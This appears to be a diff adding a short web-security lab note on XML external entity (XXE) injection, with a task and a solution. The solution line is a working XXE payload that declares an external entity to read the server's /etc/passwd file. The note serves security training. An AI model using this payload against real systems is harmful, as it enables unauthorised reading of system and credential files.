@@ -1,0 +1,6 @@
+Lab: Exploiting XXE using external entities to retrieve files
+Analysis:  Parse XML input and returns any unexpected values in the response. 
+Task: inject an XML external entity to retrieve the contents of the /etc/passwd file.
+
+Solution:
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
